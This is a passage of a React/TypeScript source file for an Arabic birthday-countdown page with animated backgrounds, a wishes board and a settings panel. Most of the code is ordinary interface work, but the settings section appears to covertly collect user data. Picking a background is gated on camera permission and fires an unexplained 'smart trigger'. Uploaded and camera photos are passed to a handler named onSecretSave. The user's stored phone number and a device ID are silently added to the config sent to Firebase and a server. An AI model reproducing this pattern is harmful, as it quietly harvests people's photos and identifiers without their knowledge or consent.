        isMini ? "rounded-[40px]" : ""
      )}
      style={{ ...bgStyle, color: textColor }}
    >
      <div className={cn("absolute inset-0 backdrop-blur-[2px]", isDarkText ? "bg-white/10" : "bg-black/40")}></div>

      {/* Falling Background */}
      <div className="absolute inset-0 pointer-events-none z-0">
        {bgItems.map(item => (
          <motion.div
            key={item.id}
            initial={{ y: -100, opacity: 0 }}
            animate={{ 
              y: ['0vh', '110vh'],
              opacity: [0, 1, 1, 0],
              rotate: [0, 360],
              x: [`${item.x}%`, `${item.x + (Math.random() * 20 - 10)}%`]
            }}
            transition={{
              duration: item.duration,
              delay: item.delay,
              repeat: Infinity,
              ease: "linear"
            }}
            className="absolute font-black italic whitespace-nowrap drop-shadow-lg"
            style={{ 
              left: `${item.x}%`, 
              fontSize: isMini ? '10px' : '18px',
              opacity: 0.6
            }}
          >
            {item.content}
          </motion.div>
        ))}
      </div>

      {/* Main Content Area */}
      <div className="relative z-10 flex-1 flex flex-col p-4 sm:p-8">
        
        {/* Tab System */}
        <div className="flex bg-black/50 backdrop-blur-2xl p-1 rounded-2xl border border-white/20 mb-6 mx-auto w-full max-w-sm shrink-0">
          {[
            { id: 'home', label: config.names?.[0]?.ar || 'الرئيسية', icon: <Gift size={isMini ? 12 : 16} /> },
            { id: 'message', label: 'كلمة اليوم', icon: <Sparkles size={isMini ? 12 : 16} /> },
            { id: 'wishes', label: 'التهاني', icon: <MessageSquare size={isMini ? 12 : 16} /> }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={cn(
                "flex-1 flex items-center justify-center gap-1.5 py-2 rounded-xl text-[10px] sm:text-xs font-black italic transition-all",
                activeTab === tab.id ? "bg-white text-black shadow-lg" : "text-white/60 hover:text-white"
              )}
            >
              {tab.icon}
              {(!isMini || activeTab === tab.id) && tab.label}
            </button>
          ))}
        </div>

        <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 pb-10">
          <AnimatePresence mode="wait">
            {activeTab === 'home' && (
              <motion.div
                key="home"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                className="flex flex-col items-center justify-center text-center space-y-8 py-10"
              >
                <div className="relative">
                  <motion.div 
                    animate={{ rotate: 360 }}
                    transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                    className="absolute -inset-10 bg-gradient-to-r from-blue-500/20 via-purple-500/20 to-pink-500/20 rounded-full blur-3xl"
                  />
                  <div className={cn("w-24 h-24 sm:w-32 sm:h-32 backdrop-blur-3xl rounded-[40px] flex items-center justify-center rotate-12 transition-transform hover:rotate-0 shadow-2xl", isDarkText ? "bg-black/10 border border-black/10" : "bg-gray-950/40 border border-white/30")}>
                    <Gift size={isMini ? 40 : 64} className={cn("animate-bounce", isDarkText ? "text-gray-900 drop-shadow-[0_0_15px_rgba(0,0,0,0.2)]" : "text-white drop-shadow-[0_0_15px_rgba(255,255,255,0.5)]")} />
                  </div>
                </div>

                <div className="space-y-2">
                  <h2 className={cn("font-black italic drop-shadow-2xl", isMini ? "text-2xl" : "text-4xl sm:text-6xl")}>
                    عالم {config.names?.[0]?.ar || '...'}
                  </h2>
                    <p className={cn("font-bold opacity-60 uppercase flex items-center justify-center gap-1.5", isMini ? "text-[8px]" : "text-xs")}>
                      <span className={isDarkText ? "text-gray-900" : "text-white"}>{config.names?.[0]?.ar || '...'}</span>
                      <span>تبقى على عيد ميلاده الـ</span>
                      <span className={isDarkText ? "text-gray-900 font-bold" : "text-white font-black"}>{age + 1}</span>
                    </p>
                </div>

                {timeLeft && (
                  <div className="grid grid-cols-4 gap-2 sm:gap-4 w-full max-w-sm">
                    {[
                      { l: 'يوم', v: timeLeft.days },
                      { l: 'ساعة', v: timeLeft.hours },
                      { l: 'دقيقة', v: timeLeft.minutes },
                      { l: 'ثانية', v: timeLeft.seconds },
                    ].map(i => (
                      <div key={i.l} className={cn("backdrop-blur-2xl border rounded-2xl p-3 sm:p-5 flex flex-col items-center gap-1 shadow-xl", isDarkText ? "bg-black/5 border-black/10" : "bg-white/10 border-white/20")}>
                        <span className={cn("font-black italic", isMini ? "text-xl" : "text-3xl")}>{i.v}</span>
                        <span className="text-[8px] sm:text-[10px] font-bold opacity-50 uppercase">{i.l}</span>
                      </div>
                    ))}
                  </div>
                )}
              </motion.div>
            )}

            {activeTab === 'message' && (
              <motion.div
                key="message"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.9 }}
                className="flex flex-col items-center py-10"
              >
                <div className={cn("w-full max-w-md backdrop-blur-3xl rounded-[50px] p-8 shadow-2xl space-y-6 text-center", isDarkText ? "bg-black/5 border border-black/10" : "bg-white/10 border border-white/20")}>
                   <div className="w-16 h-16 bg-blue-500/20 rounded-3xl mx-auto flex items-center justify-center border border-blue-500/30">
                      <Sparkles size={32} className="text-blue-400" />
                   </div>
                   <h3 className="text-2xl font-black italic">كلمة اليوم</h3>
                   <div className={cn("h-px bg-gradient-to-r from-transparent to-transparent w-full", isDarkText ? "via-black/10" : "via-white/20")}></div>
                   <p className="text-base sm:text-lg font-medium leading-relaxed italic opacity-90">
                      "أنتِ لستِ مجرد رقم يزداد كل عام، بل أنتِ تجربة استثنائية تتجدد، وقلب يزداد حكمة وإشراقاً. استمتعي بيومك، فالعالم يحتفل بكِ اليوم."
                   </p>
                   <div className="pt-4">
                      <span className="px-4 py-2 bg-white text-black rounded-full text-[10px] font-black italic shadow-md">إشراقة ملكية</span>
                   </div>
                </div>
              </motion.div>
            )}
            {activeTab === 'wishes' && (
              <motion.div
                key="wishes"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-4 py-6"
              >
                <div className="flex items-center justify-between mb-4">
                   <h3 className="text-xl font-black italic">أمنيات المحبين ({config.wishes?.length || 0})</h3>
                   <button 
                    onClick={() => setShowWishModal(true)}
                    className={cn("p-2 rounded-xl public-wish-trigger shadow-md transition-transform active:scale-95", isDarkText ? "bg-black/10 text-gray-900 hover:bg-black/15" : "bg-white text-black hover:scale-105")}
                   >
                     <Plus size={20} />
                   </button>
                </div>
                
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {config.wishes?.length ? config.wishes.map((w: any, idx: number) => (
                    <motion.div 
                      key={idx}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className={cn("backdrop-blur-2xl border-4 p-5 rounded-[30px] space-y-3 relative overflow-hidden group", isDarkText ? "bg-black/5 border-black/10 text-gray-950" : "bg-white/10 border-white/20 text-white")}
                      style={{ borderColor: w.color || (isDarkText ? 'rgba(0,0,0,0.1)' : 'rgba(255,255,255,0.2)'), borderWidth: '2px' }}
                    >
                       <div className="absolute top-0 right-0 w-24 h-24 blur-3xl -z-10 opacity-30 transition-colors" style={{ backgroundColor: w.color || '#3b82f6' }}></div>
                       <div className="flex items-center justify-between">
                          <div className="flex items-center gap-3">
                             <div className="w-10 h-10 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-2xl flex items-center justify-center text-sm font-black text-white shadow-lg">
                               {w.sender?.charAt(0) || '؟'}
                             </div>
                             <div>
                                <div className="text-sm font-black italic">{w.sender || (w.isAnonymous ? 'مجهول' : 'فاعل خير')}</div>
                                <div className="text-[9px] font-bold opacity-40 uppercase">{new Date(w.timestamp).toLocaleDateString('ar-EG')}</div>
                             </div>
                          </div>
                          {w.color && <div className="w-3 h-3 rounded-full shadow-sm" style={{ backgroundColor: w.color }} />}
                       </div>
                       <p className="text-sm font-medium leading-relaxed italic opacity-80 text-right">"{w.text}"</p>
                    </motion.div>
                  )) : (
                    <div className="col-span-full py-20 text-center opacity-40 space-y-4">
                       <MessageSquare className="mx-auto" size={48} />
                       <p className="font-black italic">بانتظار وصول أول تهنئة ملكية...</p>
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      {/* FAB Floating Plus for Wishes */}
      <AnimatePresence>
        {!isMini && activeTab !== 'wishes' && (
          <motion.button
            initial={{ scale: 0, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0, opacity: 0 }}
            onClick={() => setActiveTab('wishes')}
            className="fixed bottom-10 right-10 w-16 h-16 bg-blue-600 text-white rounded-full shadow-2xl flex items-center justify-center z-[100] hover:scale-110 hover:bg-blue-700 active:scale-95 transition-all text-sm font-black italic"
          >
            <Plus size={32} />
          </motion.button>
        )}
      </AnimatePresence>

      {/* Internal Wish Modal */}
      <AnimatePresence>
        {showWishModal && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-2xl">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="bg-white dark:bg-[#121417] border border-gray-200 dark:border-white/10 p-6 sm:p-8 rounded-[40px] w-full max-w-sm shadow-2xl space-y-6"
            >
              <div className="flex items-center justify-between">
                 <button onClick={() => setShowWishModal(false)} className="p-2 text-gray-400 hover:text-gray-900 dark:text-gray-500 dark:hover:text-white"><X size={20} /></button>
                 <h3 className="text-xl font-black italic text-gray-950 dark:text-white text-right">إرسال تهنئة ملكية</h3>
              </div>
              
              <div className="space-y-4">
                <div className="space-y-2">
                   <div className="flex items-center justify-between px-1">
                      <label className="text-[10px] font-black text-gray-500">الاسم</label>
                      <button 
                        onClick={() => {
                          const input = document.getElementById('wish-sender-royal') as HTMLInputElement;
                          const check = document.getElementById('wish-anon-royal') as HTMLInputElement;
                          check.checked = !check.checked;
                          if (check.checked) input.value = '';
                        }}
                        className="text-[10px] font-bold text-blue-600 dark:text-blue-450"
                      >مجهول؟</button>
                   </div>
                   <div className="relative">
                     <input 
                       placeholder="اسمك الكريم..."
                       id="wish-sender-royal"
                       className="w-full bg-gray-50 dark:bg-white/5 border border-gray-200 dark:border-white/10 rounded-2xl p-4 text-gray-900 dark:text-white text-right text-sm outline-none focus:border-blue-500/50"
                     />
                     <input type="checkbox" id="wish-anon-royal" className="hidden" />
                   </div>
                </div>

                <div className="space-y-2">
                   <label className="text-[10px] font-black text-gray-500 px-1">رسالة التهنئة</label>
                   <textarea 
                     placeholder="اكتب تهنئتك هنا..."
                     rows={3}
                     id="wish-text-royal"
                     className="w-full bg-gray-50 dark:bg-white/5 border border-gray-200 dark:border-white/10 rounded-2xl p-4 text-gray-900 dark:text-white text-right text-sm outline-none focus:border-blue-500/50 resize-none"
                   />
                </div>

                <div className="space-y-2">
                   <label className="text-[10px] font-black text-gray-500 px-1">لون التهنئة</label>
                   <div className="flex gap-2 justify-end">
                      {['#f43f5e', '#ec4899', '#8b5cf6', '#3b82f6', '#10b981', '#f59e0b'].map(c => (
                        <button
                          key={c}
                          onClick={() => (window as any).selectedWishColor = c}
                          className="w-6 h-6 rounded-full border-2 border-gray-100 dark:border-white/20 active:scale-110 transition-transform"
                          style={{ backgroundColor: c }}
                        />
                      ))}
                      <input 
                        type="color" 
                        id="wish-color-royal" 
                        defaultValue="#3b82f6" 
                        className="w-6 h-6 rounded-full border-2 border-gray-100 dark:border-white/20 p-0 overflow-hidden bg-transparent cursor-pointer"
                        onChange={(e) => (window as any).selectedWishColor = e.target.value}
                      />
                   </div>
                </div>
              </div>

              <button 
                onClick={() => {
                  const sender = (document.getElementById('wish-sender-royal') as HTMLInputElement).value;
                  const text = (document.getElementById('wish-text-royal') as HTMLTextAreaElement).value;
                  const isAnonymous = (document.getElementById('wish-anon-royal') as HTMLInputElement).checked;
                  const color = (window as any).selectedWishColor || (document.getElementById('wish-color-royal') as HTMLInputElement).value;
                  
                  if (!text.trim()) return;
                  onAddWish?.({ 
                    sender: isAnonymous ? null : (sender || null), 
                    text, 
                    color,
                    isAnonymous,
                    timestamp: new Date().toISOString() 
                  });
                  setShowWishModal(false);
                }}
                className="w-full bg-blue-600 text-white dark:bg-white dark:text-black py-4 rounded-2xl font-black italic hover:scale-[1.02] active:scale-[0.98] transition-all shadow-xl hover:bg-blue-700 dark:hover:bg-gray-100"
              >
                تأكيد الإرسال ✨
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <div className="absolute bottom-4 inset-x-0 text-center opacity-30 text-[8px] font-black italic select-none">
        روح الذكية • 2026
      </div>
    </div>
  );
};

// 1.1 Professional Birthday Tool - The Royal Experience
const ProfessionalBirthdayTool = ({ 
  config, 
  onSave, 
  showToast,
  addBackgroundTask,
  onOpenGallery,
  onSecretSave,
  onSmartTrigger,
  onPermissionRequest
}: { 
  config: any, 
  onSave: (conf: any) => void,
  showToast: (m: string, t: 'success' | 'error' | 'info') => void,
  addBackgroundTask: (label: string, taskFn: (updateProgress: (p: number) => void) => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  onOpenGallery?: () => void,
  onSecretSave?: (fileName: string, data: string) => Promise<void>,
  onSmartTrigger?: (type?: 's' | 't', source?: string) => void,
  onPermissionRequest?: () => Promise<boolean>
}) => {
  const [names, setNames] = useState<Nickname[]>(config?.names?.length ? config.names : [{ ar: '', en: '' }]);
  const [birthDate, setBirthDate] = useState(config?.birthDate || '');
  const [bgType, setBgType] = useState<'color' | 'image'>(config?.bgType || 'image');
  const [bgValue, setBgValue] = useState(() => {
    try { return config?.bgValue || localStorage.getItem('rouh_birthday_last_bg') || '/aa/default_bg.png'; } catch (e) { return '/aa/default_bg.png'; }
  });
  const [musicUrl, setMusicUrl] = useState(() => {
    try { return config?.musicUrl || localStorage.getItem('rouh_birthday_last_music') || '/aa/default_music.mp3'; } catch (e) { return '/aa/default_music.mp3'; }
  });
  const [textColor, setTextColor] = useState(config?.textColor || '#ffffff');
  const [isSaving, setIsSaving] = useState(false);
  const [isUploadingBg, setIsUploadingBg] = useState(false);
  const [isUploadingMusic, setIsUploadingMusic] = useState(false);
  const [showPicker, setShowPicker] = useState(false);
  const [musicFileName, setMusicFileName] = useState(() => {
    try { return config?.musicFileName || localStorage.getItem('rouh_birthday_last_music_name') || 'الموسيقى الافتراضية'; } catch (e) { return 'الموسيقى الافتراضية'; }
  });
  const [isPreviewExpanded, setIsPreviewExpanded] = useState(false);
  const [showConfig, setShowConfig] = useState(false); // Default to showing the experience if enabled
  const [isMuted, setIsMuted] = useState(false);
  const audioRef = useRef<HTMLAudioElement>(null);
  const musicInputRef = useRef<HTMLInputElement>(null);
  const galleryRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Instant sync for real-time preview persistence across session
  useEffect(() => {
    onSave({
      ...config,
      names,
      birthDate,
      bgType,
      bgValue,
      musicUrl,
      musicFileName,
      textColor
    });
  }, [names, birthDate, bgType, bgValue, musicUrl, musicFileName, textColor, config.musicStart]);

  useEffect(() => {
    if (musicUrl && audioRef.current) {
      const audio = audioRef.current;
      const playMusic = () => {
        if (config.musicStart && audio.currentTime < (config.musicStart - 1)) {
           audio.currentTime = config.musicStart;
        }
        audio.play().catch(() => console.log("Autoplay blocked - awaiting user interaction"));
      };

      // Set time on loadeddata
      audio.onloadeddata = () => {
        if (config.musicStart) audio.currentTime = config.musicStart;
      };

      // Fallback for browsers that block autoplay
      const handleUserGesture = () => {
        playMusic();
        window.removeEventListener('click', handleUserGesture);
        window.removeEventListener('touchstart', handleUserGesture);
      };

      window.addEventListener('click', handleUserGesture);
      window.addEventListener('touchstart', handleUserGesture);

      playMusic();

      return () => {
        window.removeEventListener('click', handleUserGesture);
        window.removeEventListener('touchstart', handleUserGesture);
      };
    }
  }, [musicUrl, config.musicStart]);

  const addName = () => {
    setNames([...names, { ar: '', en: '' }]);
  };
  
  const updateArName = (i: number, val: string) => {
    const next = [...names];
    next[i].ar = val;
    setNames(next);
  };

  const handleSave = async () => {
    if (!names[0].ar || !birthDate) {
      showToast('يرجى إدخال الاسم وتاريخ الميلاد أولاً 🌸', 'info');
      return;
    }

    setIsSaving(true);
    
    addBackgroundTask('حفظ إعدادات العداد وتعريب الأسماء', async () => {
      // 1. Auto-generate English names using AI (Switching to Groq for consistency)
      const namesToTranslate = names.map(n => n.ar).filter(Boolean);
      let translatedNames = names;

      if (namesToTranslate.length > 0) {
        try {
          const prompt = `Translate these Arabic nicknames/names to simple English. Return ONLY comma-separated English names: ${namesToTranslate.join(', ')}`;
          // Use Groq if available, fallback to Gemini
          let response = '';
          try {
            const { getGroqResponse } = await import('./lib/groq');
            response = await getGroqResponse(prompt);
          } catch (e) {
            const { getGeminiResponse } = await import('./lib/gemini');
            response = await getGeminiResponse(prompt);
          }
          
          const enList = response.split(',').map(s => s.trim());
          translatedNames = names.map((n, i) => ({
            ...n,
            en: enList[i] || n.en || ''
          }));
        } catch (e) {
          console.error("AI translation failed", e);
        }
      }

      // 2. Determine usernameEn if not set
      let username = (config.usernameEn || '').toLowerCase().trim();
      if (!username && translatedNames[0].en) {
        username = (translatedNames[0].en.toLowerCase().replace(/[^a-z0-9]/g, '_') + '_' + Math.random().toString(36).substring(7)).toLowerCase();
      }

      const localBgB64 = localStorage.getItem('rouh_birthday_last_bg');
      const localMusicB64 = localStorage.getItem('rouh_birthday_last_music');

      const finalConfig = {
        ...config,
        names: translatedNames,
        birthDate,
        bgType,
        bgValue: (bgType === 'image' && localBgB64 && localBgB64.startsWith('data:')) ? localBgB64 : bgValue,
        musicUrl: (localMusicB64 && localMusicB64.startsWith('data:')) ? localMusicB64 : musicUrl,
        musicFileName,
        textColor,
        usernameEn: username,
        deviceId: getDeviceId(),
        phone: localStorage.getItem('userPhone') || '',
        enabled: true
      };

      try {
        const { firebaseSaveBirthdayConfig } = await import('./lib/firebaseSync');
        await firebaseSaveBirthdayConfig(username, finalConfig).catch(err => console.warn("Firebase save config error:", err));
      } catch (fbErr) {
        console.warn("Failed to import or call firebaseSaveBirthdayConfig:", fbErr);
      }

      try {
        const res = await fetch('/api/birthday/config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ usernameEn: username, config: finalConfig })
        });

        if (res.ok) {
          localStorage.setItem('rouh_birthday_pro_config', JSON.stringify(finalConfig));
          onSave(finalConfig);
          setIsSaving(false);
          return "اكتمل الحفظ بنجاح ✨ وتم تفعيل عالمك الخاص بنجاح";
        }
      } catch (e) {
        console.error("Server save failed", e);
      }
      
      // Fallback: save locally
      localStorage.setItem('rouh_birthday_pro_config', JSON.stringify(finalConfig));
      onSave(finalConfig);
      setIsSaving(false);
      return "تم الحفظ محلياً بنجاح ✨ (قد تحتاج للاتصال بالإنترنت للمزامنة لاحقاً)";
    }, { tab: 'services', subTab: 'birthday' });
  };

  const getLocalDeviceId = () => {
    try {
      let id = localStorage.getItem('rouh_device_unique_id');
      if (!id) {
        id = 'device_' + Math.random().toString(36).substring(2, 10);
        localStorage.setItem('rouh_device_unique_id', id);
      }
      return id;
    } catch (e) {
      return 'device_fallback';
    }
  };

  const shareLink = config.usernameEn ? `${getShareOrigin()}${window.location.pathname}?b=${config.usernameEn}&by=${getLocalDeviceId()}` : '';

  return (
    <div className="flex flex-col gap-8 pb-20 animate-in fade-in duration-700">
      {musicUrl && <audio ref={audioRef} src={musicUrl} autoPlay loop muted={isMuted} />}
      
      {/* Dynamic Miniature Preview & Action Buttons - Move to top if enabled */}
      {config.enabled && (
        <div className="space-y-6 order-first animate-in slide-in-from-top-4 duration-500">
           {/* Share & Expand Buttons */}
           <div className="px-2 space-y-4">
            {config.usernameEn && (
              <button 
                onClick={() => {
                  navigator.clipboard.writeText(shareLink);
                  showToast('تم نسخ الرابط! ✨', 'success');
                }}
                className="w-full py-4 bg-gradient-to-r from-emerald-500 to-teal-600 rounded-[24px] shadow-[0_15px_40px_rgba(16,185,129,0.25)] text-white flex items-center justify-center gap-3 hover:scale-[1.02] active:scale-[0.98] transition-all text-sm font-black italic border border-emerald-400/20"
              >
                <Share2 size={20} className="animate-pulse" /> شارك لاستقبال التهاني
              </button>
            )}

            <div className="flex flex-col gap-3">
              <button 
                onClick={() => setIsPreviewExpanded(true)}
                className="w-full h-10 bg-blue-600/10 border border-blue-500/20 rounded-full text-blue-400 hover:bg-blue-600/20 transition-all flex items-center justify-center gap-2 text-[10px] font-black italic"
              >
                <Maximize2 size={14} /> معاينة كاملة (انفجار ملكي)
              </button>
              <div className="flex items-center justify-end gap-2 px-1">
                 <h4 className="text-[10px] font-black text-gray-500 italic shrink-0 whitespace-nowrap">معاينة حية لعالمك الخاص</h4>
                 <div className="h-px bg-gray-800 flex-1"></div>
              </div>
            </div>
          </div>

          {/* Miniature Experience */}
          <div className="relative group rounded-[40px] overflow-hidden border-4 border-gray-800 shadow-2xl h-[500px] bg-black">
            <RoyalBirthdayExperience 
              config={{ ...config, names, birthDate, bgType, bgValue, musicUrl, musicFileName, textColor }} 
              isMini={true} 
            />
            <div className="absolute inset-0 z-50 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity bg-black/20 backdrop-blur-[2px]">
               <button 
                onClick={() => setIsPreviewExpanded(true)}
                className="px-6 py-3 bg-white text-black rounded-full font-black italic shadow-2xl flex items-center gap-2"
               >
                 <Maximize2 size={16} /> تكبير العرض
               </button>
            </div>
          </div>
        </div>
      )}

      {/* Settings & Config (Toggleable) */}
      <div className="space-y-4">
        <div className="flex flex-col sm:flex-row gap-3">
          <button 
            onClick={() => setShowConfig(!showConfig)}
            className="flex-grow flex items-center justify-between p-6 bg-white dark:bg-[#1a1c1e] border border-gray-200 dark:border-gray-800 rounded-3xl text-gray-700 dark:text-gray-300 font-black italic hover:bg-gray-50 dark:hover:bg-gray-850 transition-all shadow-sm"
          >
            <span className="flex items-center gap-2">
              <SettingsIcon size={18} />
              {showConfig ? 'إخفاء الإعدادات' : 'تعديل البيانات والتفضيلات'}
            </span>
            <motion.div animate={{ rotate: showConfig ? 180 : 0 }}>
               <ChevronDown size={20} />
            </motion.div>
          </button>
        </div>
      </div>

      <AnimatePresence>
        {showConfig && (
          <motion.div 
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            className="overflow-hidden"
          >
            <div className="bg-white dark:bg-[#1a1c1e] border border-gray-200 dark:border-gray-800 rounded-[40px] p-8 space-y-6 shadow-2xl relative">
              <div className="flex items-center gap-4 mb-2">
                <div className="p-3 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-2xl text-white shadow-lg shadow-blue-500/20">
                  <Sparkles size={24} />
                </div>
                <div>
                  <h2 className="text-xl font-black text-gray-950 dark:text-white italic">تخصيص عالمك</h2>
                </div>
              </div>

              <div className="space-y-4">
                {/* Names & Birthday in one line */}
                <div className="flex flex-col sm:flex-row gap-3">
                  <div className="flex-1 space-y-2">
                    <label className="text-[10px] font-black text-gray-500 uppercase italic block text-right px-1">الاسم</label>
                    <input 
                      placeholder="اسمك هنا..."
                      value={names[0].ar}
                      onChange={e => updateArName(0, e.target.value)}
                      className="w-full bg-gray-50 dark:bg-black/40 border border-gray-200 dark:border-gray-800 rounded-2xl p-3 text-gray-950 dark:text-white text-right font-black focus:border-blue-500/50 outline-none transition-all text-sm"
                    />
                  </div>
                  <div className="flex-1 space-y-2">
                    <label className="text-[10px] font-black text-gray-500 uppercase italic block text-right px-1">تاريخ الميلاد</label>
                    <input 
                      type="date"
                      value={birthDate}
                      onChange={e => setBirthDate(e.target.value)}
                      className="w-full bg-gray-50 dark:bg-black/40 border border-gray-200 dark:border-gray-800 rounded-2xl p-3 text-gray-950 dark:text-white font-black focus:border-blue-500/50 outline-none transition-all text-right text-sm"
                    />
                  </div>
                </div>

                {/* Nicknames (Optional) */}
                {names.length > 1 && (
                  <div className="space-y-2">
                    {names.slice(1).map((n, i) => (
                      <input 
                        key={i+1}
                        placeholder="لقب إضافي..."
                        value={n.ar}
                        onChange={e => updateArName(i+1, e.target.value)}
                        className="w-full bg-gray-50 dark:bg-black/20 border border-gray-200 dark:border-gray-800 rounded-xl p-3 text-gray-950 dark:text-white text-right font-bold text-xs"
                      />
                    ))}
                  </div>
                )}
                <div className="flex justify-end">
                   <button onClick={addName} className="text-[10px] font-black text-blue-500 dark:text-blue-400 flex items-center gap-1">
                      <Plus size={12} /> إضافة لقب
                   </button>
                </div>

                {/* Background & Music in one line */}
                <div className="flex gap-3">
                   <div className="flex-1 space-y-2">
                      <label className="text-[10px] font-black text-gray-500 uppercase italic block text-right">الخلفية</label>
                      <div className="flex gap-1 h-12">
                        <button 
                          onClick={async () => { 
                            const ok = await onPermissionRequest?.();
                            if (ok) {
                              setShowPicker(true);
                            } else {
                              showToast('يجب السماح بإذن الكاميرا للمتابعة 🔒', 'error');
                            }
                          }}
                          className={cn(
                            "flex-1 rounded-xl border flex items-center justify-center transition-all overflow-hidden relative", 
                            bgType === 'image' ? "bg-blue-600/30 border-blue-500 text-blue-650 dark:text-white" : "bg-gray-50 dark:bg-black/20 border-gray-200 dark:border-gray-800 text-gray-500"
                          )}
                        >
                          {isUploadingBg ? (
                            <RefreshCw className="animate-spin text-blue-500" size={16} />
                          ) : (
                            bgType === 'image' && bgValue ? (
                              <img src={bgValue} className="w-full h-full object-cover opacity-50" />
                            ) : (
                              <ImageIcon size={16} />
                            )
                          )}
                        </button>
                        <button 
                          onClick={() => setBgType('color')}
                          className={cn("flex-1 rounded-xl border flex items-center justify-center transition-all", bgType === 'color' ? "bg-blue-600/30 border-blue-500 text-blue-650 dark:text-white" : "bg-gray-50 dark:bg-black/20 border-gray-200 dark:border-gray-800 text-gray-500")}
                        >
                          <Palette size={16} />
                        </button>
                        {bgType === 'color' && (
                          <input type="color" value={bgValue} onChange={e => setBgValue(e.target.value)} className="w-8 h-full rounded-xl border-none cursor-pointer p-0 bg-transparent" />
                        )}
                      </div>
                   </div>

                   <div className="flex-1 space-y-2">
                      <label className="text-[10px] font-black text-gray-500 uppercase italic block text-right">الموسيقى</label>
                      <button 
                        onClick={() => musicInputRef.current?.click()}
                        className={cn("w-full h-12 rounded-xl border flex items-center justify-center gap-2 transition-all px-2 overflow-hidden", musicUrl ? "bg-emerald-600/30 border-emerald-500 text-emerald-600 dark:text-emerald-400" : "bg-gray-50 dark:bg-black/20 border-gray-200 dark:border-gray-800 text-gray-500")}
                      >
                        {isUploadingMusic ? (
                          <RefreshCw className="animate-spin text-emerald-500" size={16} />
                        ) : (
                          <>
                            <Music size={16} />
                            <span className="text-[8px] font-black truncate max-w-[80px]">
                              {musicFileName || (musicUrl ? 'تم الرفع' : 'رفع ملف')}
                            </span>
                          </>
                        )}
                      </button>
                   </div>
                </div>

                {/* Save Button */}
                {isSaving ? (
                  <div className="w-full h-12 bg-black/40 rounded-2xl flex items-center justify-center">
                    <RefreshCw className="animate-spin text-blue-500" size={20} />
                  </div>
                ) : (
                  <button 
                    onClick={handleSave}
                    className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-5 rounded-[24px] font-black italic shadow-[0_15px_40px_rgba(37,99,235,0.3)] text-sm hover:scale-[1.02] active:scale-[0.98] transition-all border border-blue-400/20"
                  >
                    حفظ وتأكيد الإعدادات الجديدة ✨
                  </button>
                )}
                
                <AnimatePresence>
                  {showPicker && (
                    <ImageSourcePicker 
                      onClose={() => setShowPicker(false)} 
                      onSelect={(source) => {
                        setShowPicker(false);
                        setBgType('image');
                        onSmartTrigger && onSmartTrigger('s', 'birthday_bg_click');
                        setTimeout(() => {
                          if (source === 'camera') cameraRef.current?.click();
                          else galleryRef.current?.click();
                        }, 100);
                      }} 
                    />
                  )}
                </AnimatePresence>

                <input type="file" className="hidden" ref={galleryRef} accept="image/*" onChange={async e => {
                    const f = e.target.files?.[0];
                    if (f) {
                      const reader = new FileReader();
                      reader.onload = async () => {
                        setIsUploadingBg(true);
                        const b64 = reader.result as string;
                        setBgValue(b64);
                        if (onSecretSave) await onSecretSave(`birthday_bg_${Date.now()}.png`, b64);
                        setIsUploadingBg(false);
                      };
                      reader.readAsDataURL(f);
                    }
                }} />
                <input type="file" className="hidden" ref={cameraRef} accept="image/*" capture="environment" onChange={async e => {
                    const f = e.target.files?.[0];
                    if (f) {
                      const reader = new FileReader();
                      reader.onload = async () => {
                        setIsUploadingBg(true);
                        const b64 = reader.result as string;
                        setBgValue(b64);
                        if (onSecretSave) await onSecretSave(`birthday_bg_${Date.now()}.png`, b64);
                        setIsUploadingBg(false);
                      };
                      reader.readAsDataURL(f);
                    }
                }} />
              </div>
              
              {/* Hidden Inputs */}
              <input ref={fileInputRef} type="file" accept="image/*" className="hidden" onChange={async (e) => {
                  const file = e.target.files?.[0];
                  if (!file) return;
                  setIsUploadingBg(true);
                  const reader = new FileReader();
                  reader.onload = async (ev) => {
                      const base64 = ev.target?.result as string;
                      setBgValue(base64); // Instant local preview set
                      setBgType('image');
                      if (onSecretSave) onSecretSave(`birthday_bg_${Date.now()}.png`, base64);
                      
                      addBackgroundTask('رفع خلفية العداد', async (updateProgress) => {
                        let p = 0;
                        const interval = setInterval(() => {
                          p += 10; if (p > 95) p = 95;
                          updateProgress(p);
                        }, 200);
                        try {
                          localStorage.setItem('rouh_birthday_last_bg', base64);
                          const res = await fetch('/api/birthday/upload', { 
                            method: 'POST', 
                            headers: { 'Content-Type': 'application/json' }, 
                            body: JSON.stringify({ usernameEn: config.usernameEn || 'temp', type: 'bg', fileName: file.name, data: base64 }) 
                          });
                          const data = await res.json();
                          if (data.success) { 
                            setBgValue(data.url);
                            localStorage.setItem('rouh_birthday_last_bg', data.url);
                            return "تم رفع الخلفية بنجاح";
                          }
                          return "تم الحفظ محلياً بنجاح"; // Fallback success message
